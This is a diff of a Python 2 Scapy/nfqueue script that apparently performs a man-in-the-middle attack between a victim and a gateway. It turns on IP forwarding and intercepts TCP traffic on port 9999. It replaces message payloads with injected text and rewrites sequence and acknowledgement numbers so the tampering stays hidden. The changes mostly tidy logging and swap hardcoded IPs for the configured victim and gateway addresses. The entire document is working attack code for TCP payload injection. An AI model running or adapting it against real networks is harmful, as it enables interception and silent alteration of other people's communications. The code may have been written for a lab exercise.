@@ -94,20 +94,19 @@ def callback(payload):
     global messages
     global acks
     global first
+    global ip1 
+    global ip2 
 
     data = payload.get_data()
     pkt = IP(data)
 
     if (pkt["TCP"].dport == 9999 or pkt["TCP"].sport == 9999):
         if len(pkt[TCP].payload) == 0:
-            print "ACK WITHOUT PAYLOAD"
-            print "%s:%s\t---->\t%s:%s\n" % (
+            print "ACK received\t%s:%s\t---->\t%s:%s\tSeq:\t%s\tAckno.:\t%s\n" % (
                 str(pkt.src),
                 str(pkt.sport),
                 str(pkt.dst),
-                str(pkt.dport))
-
-            print"Seq:\t%s\tAckno.:\t%s\n\n\n" % (
+                str(pkt.dport),
                 str(pkt.seq),
                 str(pkt.ack))
 
@@ -115,31 +114,26 @@ def callback(payload):
             if sended:
                 ack = pkt.ack
                 if acks.has_key("ack"):
-                    print "HO GIA L'ACK"
                     pkt[TCP].ack = acks[ack]["ack"]
                     sended = False
                     first = False
                     del pkt[TCP].chksum
                     del pkt[IP].chksum
                     pkt = pkt.__class__(str(pkt[IP]))
-                    print "New ACK number: %s" % (pkt.ack)
                     payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(pkt), len(pkt))
                 else:
-                    if pkt.dst == "192.168.1.6":                    
-                        if not first:
-                            print "This isn't the first ack"
-
+                    if pkt.dst == ip1:
                         pkt.ack -= leng1
                         sended = False
                         first = False
                         del pkt[TCP].chksum
                         del pkt[IP].chksum
                         pkt = pkt.__class__(str(pkt[IP]))
-                        print "New ACK number: %s" % (pkt.ack)
+                        print "New ACK number: %s\n" % (pkt.ack)
 
                         payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(pkt), len(pkt))
                     else:
-                        print "ACK  A ---> B"
+                        print "ACK received from A to B"
                         pkt.seq += leng1
                         del pkt[TCP].chksum
                         del pkt[IP].chksum
@@ -156,61 +150,45 @@ def callback(payload):
                 payload.set_verdict(nfqueue.NF_ACCEPT)
         else:
             seq = pkt[TCP].seq
-            if messages.has_key(seq):
-                
-                print "There is this message yet"
-                
+            if messages.has_key(seq):                
                 pkt[TCP].seq = messages[seq]["seq"]
                 pkt[TCP].payload = Raw(messages[seq]["payload"])
                 pkt[TCP].ack = messages[seq]["ack"]
                 pkt[IP].len = messages[seq]["len"]
 
-                print "Modified: Msg: %s\tSeq:\t%s\tAckno.:\t%s\n" % (
+                """print "Modified: Msg: %s\tSeq:\t%s\tAckno.:\t%s\n" % (
                     str(pkt[TCP].payload),
                     str(pkt[TCP].seq),
-                    str(pkt[TCP].ack))
+                    str(pkt[TCP].ack))"""
 
                 del pkt[TCP].chksum
                 del pkt[IP].chksum
                 pkt = pkt.__class__(str(pkt[IP]))
-
+                print "Message duplicated received and forwarded"
                 payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(pkt), len(pkt))
                 sended = True
             else:
-                if pkt.dst == "192.168.1.7":
-                    print "MESSAGE"
-                    print "Msg:\t%s" % (str(pkt["TCP"].payload))
-                    
-                    print "%s:%s\t---->\t%s:%s\n" % (
+                if pkt.dst == ip2:                    
+                    print "Message received:\t%s:%s\t---->\t%s:%s\tSeq:\t%s\tAckno.:\t%s\tPayload:\t%s" % (
                         str(pkt.src),
                         str(pkt.sport),
                         str(pkt.dst),
-                        str(pkt.dport))
-
-                    print"Seq:\t%s\tAckno.:\t%s\n\n\n" % (
+                        str(pkt.dport),
                         str(pkt.seq),
-                        str(pkt.ack))         
+                        str(pkt.ack),
+                        str(pkt["TCP"].payload))       
                     
                     p = "BLABLABLA\n"
-
-                    if not first:
-                        print "Not first message"
-
                     pkt[TCP].seq += leng1
-
                     leng = len(p) - len(str(pkt[TCP].payload))
-                    print "LENG = %s" % (str(leng))
-
                     leng1 += leng
-
-
                     pkt[TCP].payload = Raw(p)
                     pkt[IP].len = len(str(pkt[IP]))
 
-                    print "Modified: Msg: %s\tSeq:\t%s\tAckno.:\t%s\n" % (
-                        str(pkt[TCP].payload),
+                    print "Modified:\tSeq:\t%s\tAckno.:\t%s\tPayload:\t%s" % (
                         str(pkt[TCP].seq),
-                        str(pkt[TCP].ack))
+                        str(pkt[TCP].ack),
+                        str(pkt[TCP].payload))
 
                     del pkt[TCP].chksum
                     del pkt[IP].chksum
@@ -220,15 +198,15 @@ def callback(payload):
                     sended = True
                 else:                   
 
-                    print "MESSAGE FROM B: %s\tSeq:\t%s\tAckno.:\t%s\n" % (
-                        str(pkt[TCP].payload),
+                    print "Message from B:\tSeq:\t%s\tAckno.:\t%s\tPayload:\t%s" % (
                         str(pkt[TCP].seq),
-                        str(pkt[TCP].ack))
+                        str(pkt[TCP].ack),
+                        str(pkt[TCP].payload))
                     pkt[TCP].ack -= leng1
-                    print "NEW SEQUENCE #: Msg: %s\tSeq:\t%s\tAckno.:\t%s\n" % (
-                        str(pkt[TCP].payload),
+                    print "New sequence #:\tSeq:\t%s\tAckno.:\t%s\tPayload:\t%s" % (
                         str(pkt[TCP].seq),
-                        str(pkt[TCP].ack))
+                        str(pkt[TCP].ack),
+                        str(pkt[TCP].payload))
 
                     messages[seq] = {
                         "seq": pkt.seq,
@@ -236,10 +214,6 @@ def callback(payload):
                         "len": pkt.len,
                         "payload": pkt[TCP].payload.load,
                     }
-                    print "Saved(2): Msg: %s\tSeq:\t%s\tAckno.:\t%s\n" % (
-                        str(messages[seq]["payload"]),
-                        str(messages[seq]["seq"]),
-                        str(messages[seq]["ack"]))
 
                     del pkt[TCP].chksum
                     del pkt[IP].chksum
@@ -252,7 +226,6 @@ def callback(payload):
                     "len": pkt.len,
                     "payload": pkt[TCP].payload.load,
                 }
-                print "Saved (2)"
 
     else:
         payload.set_verdict(nfqueue.NF_ACCEPT)
@@ -265,6 +238,8 @@ def main():
     global acks
     global first
     global leng1
+    global ip1 
+    global ip2
 
     leng1 = 0
     first = True
@@ -293,6 +268,9 @@ def main():
     except socket.error:
         print "[!] Error! GatewayIP is not a valid IPv4 address."
         sys.exit(1)
+
+    ip1 = victimIP
+    ip2 = gatewayIP
 
     IPForwardingON()
 
